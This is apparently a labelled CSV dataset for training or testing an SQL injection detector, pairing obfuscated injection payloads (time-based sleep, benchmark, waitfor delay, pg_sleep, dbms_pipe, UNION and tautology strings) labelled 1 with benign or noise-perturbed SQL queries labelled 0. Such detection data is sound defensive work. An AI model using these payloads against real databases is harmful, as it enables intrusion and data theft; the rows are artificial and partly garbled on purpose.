Query,label
"1'||  (  SeleCt 'zvPL' WHERE 5877  =  5877 UnION AlL SEleCT NulL,NullAND 4633 IN (4632,4633,4634) AND ""B2D;W""=""B2D;W"" OR 8261 = 8262 AND 8962 = 8962 AND 5370 IN (5369,5370,5371) OR 3889 NOT IN (3888,3889,3890) OR 0x1e5f=7776 OR 7990 NOT IN (7989,7990,7991) AND 4513 NOT = 4514 OR 9582=9583AND 3999 IN ((SELECT 3998),3999,4000) || 8888!=8888 AND 3559 IN (3558,3559,3560) AND 3457 IN (3456,3457,3458) AND 2182 IN (2181,2182,2183) AND 4382!=4383 AND 9772 LIKE 9772 OR 1007<>1007#4KvY-8GKb5ozC2wmxg82c",1
"SELECT MIN/**/( bound/* OR 7325 NOT IN (7324,7325,7326) OR False#fq*/) /**/AS slopeFROM dated\u",0
"-3688'|| /**/(  select 'pber'/**/from dual where (SELECT 7137)/**/ LIKE/**//**/7137order/*Yi~*/by/**/(SELECT (SELECT 1))/*6P*//*?*/&&/**/ ""?ue"" NOT LIKE ""?ueG"" /**/&&  True/**//*;[>(SELECT 0)ineUuP*/ AND   True AND ""<"" LIKE ""<""  &&  True AND/**/(SELECT 1831)/**/LIKE 1831/*r*/AND/**/True/**/ &&  True AND/**/""<"" NOT/*e/**/W%t*/LIKE/**/""<C"" && True OR 'No\'<>'No\' OR ""N?"" LIKE ""N?i"" OR ""8""<>""8""#`~*oP",1
"/**/  SELECT unless,/**/applied, expressFROM/*fV['*/know WHERE/*Z:r*/slow  IS NOT NULL",0
1  )   and0xe4b  LIKE  5475and   (  8949  LIKE  8949,1
SELECT/**/*/*.#*/FROMcontrol,0
"SELECT/*),*/ AND ""A""=""A""#$F/*/**/FROM purpose3@?",0
"1   )    )    aS llnm WHeRe6510  =  6510 aND 3202  =  LIkE  (  'abCDEFg',UpPER  (  hex  (  RANdombLOb  (  500000000/2   )    )      )    )   --",1
1 where5700  LIKE  5700,1
"SELECT/**/* FROM/**/straight/**//*TB OR 1595 NOT IN (1594,1595,1596)#i*/WHEREtherefore
= directionX",0
"c//**/airade/**/villaescusa/**/(SELECT 199),/**/1f",0
waitfor/**/delay/**/'0:(SELECT (SELECT (SELECT (SELECT 0)))):5'/**/and/**/'%'/**//*bjpa:^BY:_t*/LIKE  ',1
SELECT /;*/*Xpjb7dTc*/FROM/**/hurtWHEREmorning/*e0EL7@*/= 'summer',0
"SELECT/*)U*/post_id, meta_key, meta_value/*.GN)*/FROM
wp_postmeta WHEREpost_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,0x59c40,367681,367682,0x59c43,367684,(SELECT 367685),367686,30220,262317,30380,80779,30384,30390,80780,290065,0x47100,320706 ) /**/ || DER BYmeta_idASC",0
"SEleCtBenchmaRK  (  5000000,Md5  (  0x4C4d6142   )    )    AND 'Fgcg'  =  'FGCG",1
"SELECT/**/* FROM/*(SELECT (SELECT 1)):%&i*/lion FETCH
FIRST 0x3/*@5*/ROWS ONLY",0
"1""   )    )     )   and elt  (  1750  LIKE  7826,7826  )   and    (    (     (  ""qcro""/*KCr.&8K
vEEN	*//*?On`B*B*/LIKE/*(SELECT 9)/y$A??Trs*//**/""qcro",1
SELECT * FROM door WHERE/**/one BETWEEN '1996-(SELECT 07)-01'/*\yRT`-*/ &&  '1996-07-31',0
SELECT/**/*/*%0-9 AND 'Eh-J'='Eh-J'#*/FROM distant WHERE silent NOT LIKE 'many%',0
1%'   )    )    And (SELECT 8594)  =    (  seLEcT 8594 frOMpG_sLeeP  (  0x5   )    )   --,1
"DELETEFROMcompare WHEREsurprise =/*JX|/**/AND ""$7""<>""$7i"" OR 3050 NOT IN (3049,3050,3051)#vFH3*/'enemy'",0
"1 /**/) /**/ and/*[?)*/elt  (  (SELECT 3114) /*.L*/LIKE  0xc2a,sleep/**/ (  5 /**/ )  /**/ )    OR/**/""q""/**/NOT LIKE/**/""q"" AND ""4JhA""<>""4JhA|"" AND True OR "" OR 0#"" LIKE ""#4""#_~Ay:.ayYj",1
SELECT * FROM secondWHEREstar = 'island'/**/ ||/*|Aads	*/river LIKE 'beside',0
"SELECTcomeFROM realize UNION SELECTinstrument
FROMfly  ||/*.ke?aWe#oE*/DER BY/*[*AEG`?*$u*/sellaw0",0
"/**//*$T(I8*/ SELECT flow, stop+ ', '/**/+ oxygen+ ' ' + temperature+ ', ' + trunk AS rise  FROMgulf",0
"  SELECT QUARTER (/*r$R9dnL7S(pDY, cp|*/""2017-0x6-15"" )/*x
).t#*/;",0
"SELECT invented/**/(/*@u{
0x3:ixl*/s )  FROM rays UNION",0
"-5852  )   aS ANCa WheRe (SELECT 3574)  LIKE  3574oR 3958  LIKE/*i_My*//**GOHUcbY;7*/5536AND ""py""  NOT LIKE  ""pyV""#BRaGtezNYPoA	",1
"1%""   )    )    pRoceDUReANALySe  (  ExTrACtvaLue  (  9255,conCat  (  0X5C,  (  bENChMARk  (  0x4c4b40,mD5  (  0X52515a50   )    )      )    )     )  ,1  )   aND    (    (   ""%""  =  """,1
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 0x1 else (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 0))))))) end  )   limit1--",1
"SELECT * FROM tone WHERE swimming/**/= 'rapidly'/* OR 0 OR 'x'='x&'#Tj)=*/  &&  City = 'huge'-(""",0
"1%'   )    )    or 7427  =  Dbms_PIPe.ReCeiVE_MEssaGE  (  cHR  (  116  )  ||chr  (  87  )  ||cHr  (  90  )  ||CHR  (  109  )  ,(SELECT5)  )  --",1
"1' Or9643  =    (  SelEcT cOUNt  (  *  )   fROMDoMAin.doMaiNs as t1,domAiN.ColUmnS AS T2,DOMAiN.TABLES AS t3  )  ",1
"SELECT * FROM label WHERE against/**/= 'trade'/**/ &&/*_--*/ ( heard LIKE 'biggest' || flow/**/LIKE/*b~ZOR 0x0 || 1947=1948#+*/'simple'/*M;'DzI""g*/)/**/)'K(s",0
"febrer/*-*.T>CM'-]""LY^F!w0x4?Xf?`@itYx*/pedrouzo",0
" select * fromusers where/**/id  =  1 or 1 AND """"="""" OR ""Ti'"" LIKE ""Ti'i"" AND ""	yN""!=""	yNM""#"".  LIKE  1/*`*/union select 0x1,version  (   /*T~,*/)  /*CG?L*/-- 14Ub",1
SELECT/*E6})}0x56`*/*/**/FROMdrop WHERE    NOT offer/*:X|*/= 'conversation',0
"pl./**/currocuchares,/**/72,",0
"/**/ SELECT/**/islandID/**/AS/**/ID, skin AS because FROM/**/thousand",0
sEleCt   (  CASe wHeN   (  8362  =  7572  )   TheN8362 elsE CasT  (  1 As iNT  )  /  (  select0 fROm Dual  )   eNd  )   from dUAL--,1
"1'+/**//*|8.3o.gUBEa*/(/*:*/ select/*(SELECT 0x4)|h[_lY;IZ	M*/qdon/**/where/*!_!\WaH*/0x24ed/*,m4Ew!wm*//*b*/LIKE/*L	KCG:@[a*//*ci+*/9453",1
"1%'/*""w*//*;;`,sF*/)/*hD*//*A.Q/d*//*:EM*/and/*?`\,\!*/(SELECT/**/(SELECT 2006))/*9;*/ LIKE/*oY~!Z{\(SELECT/**/(SELECT (SELECT (SELECT/**/8)))):*/ 2006",1
"1%'/*w*//*H*/ ) /**/  )   /**//*T'a/<*/)  /**/and (SELECT (SELECT 6537))/*]`:9OAeJ*aW*/ LIKE  dbms_pipe.receive_message  (  chr/*d$*/ (  76  )   OR chr  (  (SELECT 116)  )  ||chr  ( /**/117  ) /*qP.D+*/||chr  (/*Xu)"".OZ*/ 65 /*f_~.*/)  ,(SELECT (SELECT 5))/*]5P>rime*//*wni*/) /*<K*/ and  /**/ (/**//**/  (  /**/ /*=;8*/(  '%'  LIKE /*Ec*/'",1
